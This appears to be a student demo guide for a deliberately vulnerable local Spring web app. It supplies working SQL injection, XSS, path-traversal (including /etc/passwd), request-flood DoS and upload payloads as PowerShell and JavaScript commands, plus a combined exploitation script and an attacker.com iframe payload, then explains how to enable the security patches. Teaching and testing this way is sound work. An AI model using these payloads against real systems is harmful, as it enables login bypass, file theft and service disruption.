# 🔐 DEMO GUIDE - Web Security Vulnerabilities Testing

## ✅ Application Status
- **Server:** http://localhost:8080
- **Status:** ✅ Running on port 8080
- **Home:** http://localhost:8080/

---

## 📌 Quick Links

| Vuln | Page | URL | Test Payload |
|------|------|-----|---|
| SQLi | Login | http://localhost:8080/login | `' OR '1'='1 --` |
| XSS | Search | http://localhost:8080/search | `<script>alert('XSS')</script>` |
| Path Traversal | View Log | http://localhost:8080/view-log | `../../../pom.xml` |
| DoS | Search | http://localhost:8080/search | Spam requests |
| Upload | Upload | http://localhost:8080/upload | File > 1MB |
| Rate Limit | Test | http://localhost:8080/rate-limit-test | 150+ requests |
| Input Validation | Register | http://localhost:8080/register | XSS in email |
| Directory Traversal | Demo Log | http://localhost:8080/view-log-demo | Auto demo |

---

## 🚀 TEST EACH VULNERABILITY

### 1️⃣ SQL Injection (SQLi) - Login Bypass

#### Via Browser UI:
1. Open: http://localhost:8080/login
2. Enter:
   - **Username:** `' OR '1'='1 --`
   - **Password:** `anything`
3. Click Login → ✅ Bypass successful!

#### Via PowerShell Terminal:
```powershell
# Method 1: curl.exe
curl.exe -X POST "http://localhost:8080/login" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "username=' OR '1'='1 --&password=test"

# Method 2: Invoke-RestMethod
Invoke-RestMethod -Uri "http://localhost:8080/login" `
  -Method POST `
  -Body @{
      username = "' OR '1'='1 --"
      password = "test"
  }
```

**Expected Response:** Redirect to dashboard or success message

---

### 2️⃣ Cross-Site Scripting (XSS)

#### Via Browser UI:
1. Open: http://localhost:8080/search
2. Enter Query: `<script>alert('XSS Vulnerability!')</script>`
3. Click Search → 🚨 Alert popup appears!

#### Via PowerShell:
```powershell
# Method 1: URL-encoded
$payload = [System.Web.HttpUtility]::UrlEncode("<script>alert('XSS')</script>")
curl.exe -X POST "http://localhost:8080/search" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "query=$payload"

# Method 2: Direct
Invoke-RestMethod -Uri "http://localhost:8080/search" `
  -Method POST `
  -Body @{ query = "<script>alert('XSS')</script>" }

# Method 3: Browser Console (JavaScript)
# Open DevTools (F12) → Console, paste:
fetch('/search', { method: 'POST', body: new URLSearchParams({ query: "<script>alert('XSS')</script>" }) })
```

**Expected:** Script should execute (alert or reflected in response)

---

### 3️⃣ Path Traversal - Read Arbitrary Files

#### Via Browser:
1. Open: http://localhost:8080/view-log
2. Filename: `../../../pom.xml`
3. Click View Log → 📄 File content displayed!

#### Via PowerShell:
```powershell
# Read pom.xml
curl.exe "http://localhost:8080/view-log?filename=../../../pom.xml"

# Read application.properties
curl.exe "http://localhost:8080/view-log?filename=../../../src/main/resources/application.properties"

# Or using Invoke-RestMethod
Invoke-RestMethod -Uri "http://localhost:8080/view-log?filename=../../../pom.xml"

# List other files you can try:
# ../../../HELP.md
# ../../../README.md
# ../../../SECURITY_DEMO.md
# ../windows/system32/drivers/etc/hosts (Windows)
# ../../../etc/passwd (Linux)
```

**Expected:** Content of pom.xml or other files displayed

---

### 4️⃣ Denial of Service (DoS) - Spam Search

#### Via Browser Console (F12):
```javascript
// Auto-spam 100 requests
for (let i = 0; i < 100; i++) {
    fetch('/search', {
        method: 'POST',
        body: new URLSearchParams({ query: 'dos-spam-' + i })
    }).catch(e => console.log(i));
}
console.log("Spam sent!");
```

#### Via PowerShell:
```powershell
# Spam 100 requests rapidly
for ($i = 0; $i -lt 100; $i++) {
    curl.exe -X POST "http://localhost:8080/search" `
      -H "Content-Type: application/x-www-form-urlencoded" `
      -d "query=dos-spam-$i" 2>&1 | Out-Null
    Write-Host "Request $i sent"
}
Write-Host "DoS attack sent!"

# Or with Invoke-RestMethod
foreach ($i in 1..100) {
    Invoke-RestMethod -Uri "http://localhost:8080/search" `
      -Method POST `
      -Body @{ query = "dos-$i" } 2>&1 | Out-Null
}
```

**Expected:** Server may slow down or eventually stop responding

---

### 5️⃣ Upload File > 1MB (Upload DoS)

#### Via Browser UI:
1. Open: http://localhost:8080/upload
2. Create or select file > 1MB
3. Try uploading → ❌ Client-side error OR server-side rejection

#### Via PowerShell:
```powershell
# Create a 2MB test file
$filePath = "$env:TEMP\test-2mb.bin"
$stream = [System.IO.File]::Create($filePath)
$stream.SetLength(2MB)
$stream.Close()

# Upload it (should fail)
curl.exe -F "file=@$filePath" "http://localhost:8080/upload"

# Or PowerShell REST
$form = @{ file = @{
    FileName = 'test-2mb.bin'
    Data = [System.IO.File]::ReadAllBytes($filePath)
}}
Invoke-RestMethod -Uri "http://localhost:8080/upload" `
  -Method POST `
  -Form $form

# Create even larger file (5MB)
$stream = [System.IO.File]::Create("$env:TEMP\test-5mb.bin")
$stream.SetLength(5MB)
$stream.Close()
curl.exe -F "file=@$env:TEMP\test-5mb.bin" "http://localhost:8080/upload"
```

**Expected:** Error message "File size exceeds 1MB limit"

---

### 6️⃣ Rate Limiting Bypass - Spam Requests

#### Via Browser Console:
```javascript
// Send 150+ requests quickly
for (let i = 0; i < 150; i++) {
    fetch('/rate-limit-test')
        .then(r => r.json())
        .then(data => console.log('Request ' + i + ':', data))
        .catch(e => console.log('Blocked at', i));
}
```

#### Via PowerShell:
```powershell
# Send 150 requests and check response codes
for ($i = 0; $i -lt 150; $i++) {
    try {
        $response = Invoke-RestMethod -Uri "http://localhost:8080/rate-limit-test"
        if ($response) {
            Write-Host "Request $i: Success" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Request $i: Blocked (429)" -ForegroundColor Red
    }
}

# Simpler - spam without checking
foreach ($i in 1..150) {
    curl.exe http://localhost:8080/rate-limit-test 2>&1 | Out-Null
}
Write-Host "150 requests sent"

# Check if 429 (Too Many Requests) is returned
for ($i = 1; $i -le 150; $i++) {
    $response = curl.exe -w "%{http_code}" -o $null http://localhost:8080/rate-limit-test 2>&1
    if ($response -eq 429) {
        Write-Host "Rate limit triggered at request $i"
        break
    }
}
```

**Expected:** Eventually get 429 (Too Many Requests) or message about rate limiting

---

### 7️⃣ Input Validation Bypass - Register with XSS

#### Via Browser UI:
1. Open: http://localhost:8080/register
2. Fill:
   - **Username:** `testuser123`
   - **Email:** `<script>alert('XSS')</script>@test.com` or `<img src=x onerror=alert('XSS')>`
   - **Password:** `Test123!`
3. Click Register → ✅ Registered (no validation!)

#### Via PowerShell:
```powershell
# XSS payload in email
$payload = '<script>alert("XSS")</script>'
curl.exe -X POST "http://localhost:8080/register" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "username=testuser&email=$payload&password=Pass123"

# Or with special characters
curl.exe -X POST "http://localhost:8080/register" `
  -d "username=hacker&email=<img src=x onerror=alert('XSS')>&password=anything"

# Using Invoke-RestMethod
Invoke-RestMethod -Uri "http://localhost:8080/register" `
  -Method POST `
  -Body @{
      username = "attacker"
      email = "<script>alert('XSS')</script>"
      password = "weak"
  }

# Try various invalid emails
@"
test@malicious.com
admin@localhost
' OR '1'='1 --
<iframe src=http://attacker.com></iframe>
`
"@ | ForEach-Object {
    Write-Host "Testing: $_"
    Invoke-RestMethod -Uri "http://localhost:8080/register" `
      -Method POST `
      -Body @{ username = "test"; email = $_; password = "pass" } 2>&1 | Out-Null
}
```

**Expected:** XSS payload should be registered without validation

---

### 8️⃣ Directory Traversal Demo - View Logs

#### Via Browser:
1. Open: http://localhost:8080/view-log-demo
   - Should display `logs/demo.log` automatically
2. Then test path traversal on `/view-log?filename=../../../pom.xml`

#### Via PowerShell:
```powershell
# View demo log
curl.exe "http://localhost:8080/view-log-demo"

# Attempt traversal with different payloads
@(
    "../../../pom.xml",
    "../../pom.xml",
    "../pom.xml",
    "../../../src/main/resources/application.properties",
    "../../../README.md",
    "../../../HELP.md"
) | ForEach-Object {
    Write-Host "`n=== Testing: $_ ==="
    curl.exe "http://localhost:8080/view-log?filename=$_" 2>&1 | Select-Object -First 20
}
```

**Expected:** Access to files outside logs/ directory

---

## 🛠️ ENABLE SECURITY (Gatekeeper Pattern)

### Steps to Patch All Vulnerabilities:

1. **Open:** `src/main/java/com/example/gatekeeprt_design/controller/UnifiedController.java`

2. **Find & Replace all:**
   ```
   // ========== SECURE (UNCOMMENT) ==========
   if (securityGateway != null) {
   ```
   
   **To:**
   ```
   if (securityGateway != null) {
   ```

3. **Also enable RateLimitingFilter:**
   - Uncomment `@Component` in `src/main/java/com/example/gatekeeprt_design/filter/RateLimitingFilter.java`

4. **Rebuild & Restart:**
   ```powershell
   cd "d:\UET-VNU\HK1 -năm 3\Software Structure\gatekeeprt-design"
   mvn clean package -DskipTests
   # Kill old process
   Stop-Process -Name java -Force 2>&1 | Out-Null
   # Start new
   Start-Process -FilePath "java" -ArgumentList @('-jar', 'target/gatekeeprt-design-0.0.1-SNAPSHOT.jar') -WindowStyle Hidden
   Start-Sleep -Seconds 5
   ```

5. **Test again** - all vulnerabilities should be fixed!

---

## 📊 Full Exploitation Script (PowerShell)

Save as `test-all-vulns.ps1`:

```powershell
# Test all 8 vulnerabilities
param(
    [string]$BaseUrl = "http://localhost:8080"
)

Write-Host "=== Web Security Vulnerabilities Test ===" -ForegroundColor Cyan

# 1. SQLi
Write-Host "`n[1] Testing SQL Injection (Login)..."
curl.exe -X POST "$BaseUrl/login" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "username=' OR '1'='1 --&password=test" 2>&1 | Select-String "dashboard|success|error" | Select-Object -First 1

# 2. XSS
Write-Host "[2] Testing XSS (Search)..."
$xss = [System.Web.HttpUtility]::UrlEncode("<script>alert('XSS')</script>")
curl.exe -X POST "$BaseUrl/search" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "query=$xss" 2>&1 | Select-String "script" | Select-Object -First 1

# 3. Path Traversal
Write-Host "[3] Testing Path Traversal (View Log)..."
curl.exe "$BaseUrl/view-log?filename=../../../pom.xml" 2>&1 | Select-String "modelVersion|maven" | Select-Object -First 1

# 4. DoS
Write-Host "[4] Testing DoS (Spam Search)..."
$dosCount = 0
for ($i = 0; $i -lt 50; $i++) {
    curl.exe -X POST "$BaseUrl/search" `
      -H "Content-Type: application/x-www-form-urlencoded" `
      -d "query=dos$i" 2>&1 | Out-Null
    $dosCount++
}
Write-Host "  Sent $dosCount DoS requests"

# 5. Upload
Write-Host "[5] Testing Upload DoS (Large File)..."
$testFile = "$env:TEMP\test-2mb.bin"
$stream = [System.IO.File]::Create($testFile)
$stream.SetLength(2MB)
$stream.Close()
curl.exe -F "file=@$testFile" "$BaseUrl/upload" 2>&1 | Select-String "exceeds|failed" | Select-Object -First 1

# 6. Rate Limit
Write-Host "[6] Testing Rate Limit (150 requests)..."
$blocked = 0
for ($i = 0; $i -lt 150; $i++) {
    curl.exe "$BaseUrl/rate-limit-test" 2>&1 | Out-Null
}
Write-Host "  Sent 150 requests"

# 7. Input Validation
Write-Host "[7] Testing Input Validation (Register)..."
curl.exe -X POST "$BaseUrl/register" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "username=hacker&email=<script></script>&password=pass" 2>&1 | Select-String "success|registered" | Select-Object -First 1

# 8. Directory Traversal
Write-Host "[8] Testing Directory Traversal (Logs)..."
curl.exe "$BaseUrl/view-log-demo" 2>&1 | Select-String "Demo log|INFO" | Select-Object -First 1

Write-Host "`n=== Test Complete ===" -ForegroundColor Cyan
```

**Run:**
```powershell
.\test-all-vulns.ps1
```

---

## 🔍 Manual Testing Checklist

- [ ] SQLi: Username bypass successful?
- [ ] XSS: Alert popup appears on search?
- [ ] Path Traversal: Can read pom.xml?
- [ ] DoS: Can spam 100+ requests?
- [ ] Upload: Large file rejected?
- [ ] Rate Limit: 429 after 100 requests?
- [ ] Input Validation: XSS payload registered?
- [ ] Directory Traversal: Demo log displays?

---

## 🔒 After Applying Security Patches

Test again to verify fixes:

```powershell
# 1. SQLi should fail (need valid credentials)
curl.exe -X POST "http://localhost:8080/login" `
  -d "username=' OR '1'='1 --&password=test" 
# Should fail

# 2. XSS should escape
curl.exe -X POST "http://localhost:8080/search" `
  -d "query=<script>alert('XSS')</script>"
# Should return &lt;script&gt;... (escaped)

# 3. Path Traversal should be blocked
curl.exe "http://localhost:8080/view-log?filename=../../../pom.xml"
# Should error: "Invalid path"

# 4. Rate Limiting should work
for ($i=0; $i -lt 150; $i++) { curl.exe http://localhost:8080/rate-limit-test }
# Should return 429 after limit

# 5. Email validation should work
curl.exe -X POST "http://localhost:8080/register" `
  -d "username=test&email=invalid&password=pass"
# Should error: "Invalid email format"
```

---

## 📞 Troubleshooting

**Application won't start?**
```powershell
# Check if port 8080 is in use
netstat -ano | findstr :8080

# Kill existing Java process
Stop-Process -Name java -Force

# Rebuild
mvn clean package
```

**Can't test XSS popup?**
- Use browser console for JavaScript tests
- Check browser security settings

**Path traversal not working?**
- Try different relative paths like `../../` or `..\`
- Check file permissions

---

## 📚 Reference Files

- **Main Controller:** `src/main/java/com/example/gatekeeprt_design/controller/UnifiedController.java`
- **Security Gateway:** `src/main/java/com/example/gatekeeprt_design/security/SecurityGateway.java`
- **Input Validator:** `src/main/java/com/example/gatekeeprt_design/security/InputValidator.java`
- **Rate Limiter:** `src/main/java/com/example/gatekeeprt_design/filter/RateLimitingFilter.java`
- **Full Guide:** `SECURITY_DEMO.md`

---

**Created:** Oct 29, 2024  
**Status:** ✅ Ready for Testing  
**Port:** 8080  
**Remember:** Educational purposes only!
